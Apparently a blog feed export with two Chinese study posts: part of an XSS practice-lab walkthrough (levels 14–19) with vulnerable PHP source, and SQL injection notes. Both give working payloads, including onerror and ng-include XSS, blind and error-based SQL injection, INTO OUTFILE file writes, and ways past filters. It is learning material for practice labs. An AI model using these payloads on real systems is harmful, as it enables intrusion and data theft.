<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912135642044.png" alt="image-20220912135642044"></p>
<p>可以看到我们提交的src参数被插入到了<code>&lt;span&gt;</code>标签的<code>class</code>属性值中，但是前面还有<code>ng-include</code>这样的字符。</p>
<p><code>ng-include</code>是<code>angular js</code>中的东西，其作用相当于php的include函数。这里就是将<code>1.gif</code>这个文件给包含进来。</p>
<h4 id="ng-include相关知识点"><a href="#ng-include相关知识点" class="headerlink" title="ng-include相关知识点"></a>ng-include相关知识点</h4><p><strong>1、ng-include 指令用于包含外部的 HTML文件。</strong></p>
<p><strong>2、包含的内容将作为指定元素的子节点。</strong></p>
<p><strong>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</strong></p>
<p><strong>4、默认情况下，包含的文件需要包含在同一个域名下。</strong></p>
<p><strong>特别值得注意的几点如下：</strong></p>
<p><strong>1.ng-include,如果单纯指定地址，必须要加引号</strong></p>
<p><strong>2.ng-include,加载外部html，script标签中的内容不执行</strong></p>
<p><strong>3.ng-include,加载外部html中含有style标签样式可以识别</strong></p>
<p>构造函数<br>?src&#x3D;’level1.php?name&#x3D;<img src=1 onerror=alert(1)>‘<br>因为这里参数值算是一个地址，所以需要添加引号。</p>
<p>但是level1.php不是一个php文件吗？</p>
<p>这里解释一下，这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。</p>
<h4 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h4><p><code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
<h4 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;src&quot;];</code></p>
<p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912140337047.png" alt="image-20220912140337047"></p>
<p>可以看到，我们输入的值被插到了<center>标签中，我们尝试直接弹窗，发现很多字符被编码，来看看源代码</p>
<h4 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</code></p>
<p><code>$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</code></p>
<p><code>$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</code></p>
<p><code>$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);</code></p>
<p><code>echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到，将参数值中的script替换成&amp;nbsp;，将参数值中的空格也替换成&amp;nbsp;，将参数值中的&#x2F;符号替换成&amp;nbsp;</p>
<p>与我们的猜想一致</p>
<p>绕过思路：可以用回车来将它们分开。</p>
<p>而且这里&#x2F;符号也被编码了，所以我们需要的是一个不需要闭合的标签，比</p>
<p>如之前所用过的<img></p>
<img src="111" onerror=alert(‘xss’) >

<p>回车可以用url编码%0a表示</p>
<h4 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h4><p><code>&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</code></p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912141605920.png" alt="image-20220912141605920"></p>
<p>可以看到提交的参数插入到了<embed>标签的src属性中，尝试直接弹窗，发现转义了很多符号。</p>
<p>尝试构造事件弹窗，可以看到这里的src没有用引号闭合，我们就不用管</p>
<h4 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h4><p><code>onclick=alert(&#39;xss&#39;)</code></p>
<pre><code>onmousedown=&#39;alert(1)&#39;
</code></pre>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912142104313.png" alt="image-20220912142104313"></p>
<h4 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code>·</p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到和我们的猜测一致</p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>与17关一致</p>
<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>与之前一致，不过用了引号将src闭合，所以不能直接在后面添加语句，我们可以通过F12控制台添加</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/10/16/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="SQL注入学习笔记"><a href="#SQL注入学习笔记" class="headerlink" title="SQL注入学习笔记"></a>SQL注入学习笔记</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1625389326994-0be8a5eb-af50-4eb1-a2ef-dc29452d2839.png"></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="（1）注入的分类"><a href="#（1）注入的分类" class="headerlink" title="（1）注入的分类"></a>（1）注入的分类</h3><h4 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h4><h5 id="▲基于错误的-SQL-注入"><a href="#▲基于错误的-SQL-注入" class="headerlink" title="▲基于错误的 SQL 注入"></a>▲基于错误的 SQL 注入</h5><h5 id="▲联合查询的类型"><a href="#▲联合查询的类型" class="headerlink" title="▲联合查询的类型"></a>▲联合查询的类型</h5><h5 id="▲堆查询注射"><a href="#▲堆查询注射" class="headerlink" title="▲堆查询注射"></a>▲堆查询注射</h5><h5 id="▲SQL-盲注"><a href="#▲SQL-盲注" class="headerlink" title="▲SQL 盲注"></a>▲SQL 盲注</h5><h6 id="•基于布尔-SQL-盲注"><a href="#•基于布尔-SQL-盲注" class="headerlink" title="•基于布尔 SQL 盲注"></a>•基于布尔 SQL 盲注</h6><h6 id="•基于时间的-SQL-盲注"><a href="#•基于时间的-SQL-盲注" class="headerlink" title="•基于时间的 SQL 盲注"></a>•基于时间的 SQL 盲注</h6><h6 id="•基于报错的-SQL-盲注"><a href="#•基于报错的-SQL-盲注" class="headerlink" title="•基于报错的 SQL 盲注"></a>•基于报错的 SQL 盲注</h6><h4 id="基于如何处理输入的-SQL-查询（数据类型）"><a href="#基于如何处理输入的-SQL-查询（数据类型）" class="headerlink" title="基于如何处理输入的 SQL 查询（数据类型）"></a>基于如何处理输入的 SQL 查询（数据类型）</h4><h5 id="▲基于字符串"><a href="#▲基于字符串" class="headerlink" title="▲基于字符串"></a>▲基于字符串</h5><h5 id="▲数字或整数为基础的"><a href="#▲数字或整数为基础的" class="headerlink" title="▲数字或整数为基础的"></a>▲数字或整数为基础的</h5><h4 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h4><h5 id="▲通过用户输入的表单域的注射。"><a href="#▲通过用户输入的表单域的注射。" class="headerlink" title="▲通过用户输入的表单域的注射。"></a>▲通过用户输入的表单域的注射。</h5><h5 id="▲通过-cookie-注射。"><a href="#▲通过-cookie-注射。" class="headerlink" title="▲通过 cookie 注射。"></a>▲通过 cookie 注射。</h5><h5 id="▲通过服务器变量注射。-（基于头部信息的注射）"><a href="#▲通过服务器变量注射。-（基于头部信息的注射）" class="headerlink" title="▲通过服务器变量注射。 （基于头部信息的注射）"></a>▲通过服务器变量注射。 （基于头部信息的注射）</h5><h3 id="（2）系统函数"><a href="#（2）系统函数" class="headerlink" title="（2）系统函数"></a>（2）系统函数</h3><ol>
<li>version()——MySQL 版本</li>
<li>user()——数据库用户名</li>
<li>database()——数据库名 </li>
<li>@@datadir——数据库路径</li>
<li>@@version_compile_os——操作系统版本</li>
</ol>
<h3 id="（3）字符串连接函数"><a href="#（3）字符串连接函数" class="headerlink" title="（3）字符串连接函数"></a>（3）字符串连接函数</h3><ol>
<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
</ol>
<h3 id="（4）一般流程"><a href="#（4）一般流程" class="headerlink" title="（4）一般流程"></a>（4）一般流程</h3><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><h6 id="select-schema-name-from-information-schema-schemata"><a href="#select-schema-name-from-information-schema-schemata" class="headerlink" title="select schema_name from information_schema.schemata"></a>select schema_name from information_schema.schemata</h6><h5 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h5><h6 id="select-table-name-from-information-schema-tables-where-table-schema-x3D-’xxxxx’"><a href="#select-table-name-from-information-schema-tables-where-table-schema-x3D-’xxxxx’" class="headerlink" title="select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’"></a>select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’</h6><h5 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h5><h6 id="select-column-name-from-information-schema-columns-where-table-name-x3D-’xxxxx’"><a href="#select-column-name-from-information-schema-columns-where-table-name-x3D-’xxxxx’" class="headerlink" title="select column_name from information_schema.columns where table_name&#x3D;’xxxxx’"></a>select column_name from information_schema.columns where table_name&#x3D;’xxxxx’</h6><h5 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h5><h6 id="select-from"><a href="#select-from" class="headerlink" title="select *** from ****"></a>select *** from ****</h6><p>PS：一般都会用到group_concat来显示所有数据。</p>
<h3 id="（5）盲注"><a href="#（5）盲注" class="headerlink" title="（5）盲注"></a>（5）盲注</h3><h4 id="1、基于布尔-SQL-盲注———-构造逻辑判断"><a href="#1、基于布尔-SQL-盲注———-构造逻辑判断" class="headerlink" title="1、基于布尔 SQL 盲注———-构造逻辑判断"></a>1、基于布尔 SQL 盲注———-构造逻辑判断</h4><h6 id="▲left-database-1-gt-’s’-x2F-x2F-left-函数"><a href="#▲left-database-1-gt-’s’-x2F-x2F-left-函数" class="headerlink" title="▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数"></a>▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数</h6><p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前b 位</p>
<h6 id="▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema-x3D-database-limit-0-1-1-1-x3D-101-–-x2F-x2F-substr-函数，ascii-函数"><a href="#▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema-x3D-database-limit-0-1-1-1-x3D-101-–-x2F-x2F-substr-函数，ascii-函数" class="headerlink" title="▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数"></a>▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数</h6><p>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值 </p>
<h6 id="▲ascii-substr-select-database-1-1-x3D-98"><a href="#▲ascii-substr-select-database-1-1-x3D-98" class="headerlink" title="▲ascii(substr((select database()),1,1))&#x3D;98"></a>▲ascii(substr((select database()),1,1))&#x3D;98</h6><h6 id="▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDERBY-id-LIMIT-0-1-1-1-gt-98-23-x2F-x2F-ORD-函数，MID-函数"><a href="#▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDERBY-id-LIMIT-0-1-1-1-gt-98-23-x2F-x2F-ORD-函数，MID-函数" class="headerlink" title="▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数"></a>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数</h6><p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值</p>
<h6 id="▲regexp-正则注入-select-user-regexp-‘-a-z-’"><a href="#▲regexp-正则注入-select-user-regexp-‘-a-z-’" class="headerlink" title="▲regexp 正则注入 select user() regexp ‘^[a-z]’;"></a>▲regexp 正则注入 select user() regexp ‘^[a-z]’;</h6><p>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。</p>
<h6 id="▲like-匹配注入"><a href="#▲like-匹配注入" class="headerlink" title="▲like 匹配注入"></a>▲like 匹配注入</h6><p>select user() like ‘ro%’</p>
<h4 id="2、基于报错的-SQL-盲注——构造-payload-让信息通过错误提示回显出来"><a href="#2、基于报错的-SQL-盲注——构造-payload-让信息通过错误提示回显出来" class="headerlink" title="2、基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来"></a>2、基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来</h4><h6 id="▲extractvalue-1-concat-0x7e-select-version-0x7e-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲extractvalue-1-concat-0x7e-select-version-0x7e-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h6><h6 id="▲updatexml-1-concat-0x7e-select-version-0x7e-1-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲updatexml-1-concat-0x7e-select-version-0x7e-1-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h6><h6 id="▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x-x2F-x2F-mysql-重复特性，此处重复了-version，所以报错。"><a href="#▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x-x2F-x2F-mysql-重复特性，此处重复了-version，所以报错。" class="headerlink" title="▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。"></a>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。</h6><h4 id="3、基于时间的-SQL-盲注———-延时注入"><a href="#3、基于时间的-SQL-盲注———-延时注入" class="headerlink" title="3、基于时间的 SQL 盲注———-延时注入"></a>3、基于时间的 SQL 盲注———-延时注入</h4><h6 id="▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-x2F-x2F-if-判断语句，条件为假，执行-sleep"><a href="#▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-x2F-x2F-if-判断语句，条件为假，执行-sleep" class="headerlink" title="▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep"></a>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep</h6><h3 id="（6）导入导出相关操作"><a href="#（6）导入导出相关操作" class="headerlink" title="（6）导入导出相关操作"></a>（6）导入导出相关操作</h3><h5 id="1、load-file-导出文件"><a href="#1、load-file-导出文件" class="headerlink" title="1、load_file()导出文件"></a>1、load_file()导出文件</h5><h5 id="2、文件导入到数据库"><a href="#2、文件导入到数据库" class="headerlink" title="2、文件导入到数据库"></a>2、文件导入到数据库</h5><h5 id="3、导入到文件"><a href="#3、导入到文件" class="headerlink" title="3、导入到文件"></a>3、导入到文件</h5><p>SELECT…..INTO OUTFILE ‘file_name’</p>
<p>Select  …… into outfile “c:\phpnow\htdocs\test.php”</p>
<h3 id="（7）增删改函数"><a href="#（7）增删改函数" class="headerlink" title="（7）增删改函数"></a>（7）增删改函数</h3><h5 id="1、插入"><a href="#1、插入" class="headerlink" title="1、插入"></a>1、插入</h5><p>insert into users values(‘16’,’lcamry’,’lcamry’);</p>
<h5 id="2、删除"><a href="#2、删除" class="headerlink" title="2、删除"></a>2、删除</h5><p>删数据: delete from </p>
<p>表名; delete from 表名 where id&#x3D;1; </p>
<p> 删除结构： </p>
<p>删数据库：drop database 数据库名; </p>
<p>删除表：drop table 表名; </p>
<p>删除表中的列:alter table 表名 drop column 列名;</p>
<p>ps:delete from users where id&#x3D;16</p>
<h5 id="3、修改-x2F-更新"><a href="#3、修改-x2F-更新" class="headerlink" title="3、修改&#x2F;更新"></a>3、修改&#x2F;更新</h5><p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; </p>
<p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;</p>
<p>ps: update users set username&#x3D;’tt’ where id&#x3D;15</p>
<h3 id="（8）HTTP-头部"><a href="#（8）HTTP-头部" class="headerlink" title="（8）HTTP 头部"></a>（8）HTTP 头部</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>如何绕过 or 和 and 过滤。一般性提供以下几种思路：</p>
<p>（1）大小写变形 Or,OR,oR </p>
<p>（2）编码，hex，urlencode </p>
<p>（3）添加注释&#x2F;<em>or</em>&#x2F; </p>
<p>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||</p>
<p>对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；</p>
<p>对于空格，有较多的方法：</p>
<p> %09 TAB 键（水平）</p>
<p> %0a 新建一行</p>
<p> %0c 新的一页</p>
<p> %0d return 功能 </p>
<p>%0b TAB 键（垂直）</p>
<p> %a0 空格</p>
]]></content>
  </entry>
</search>
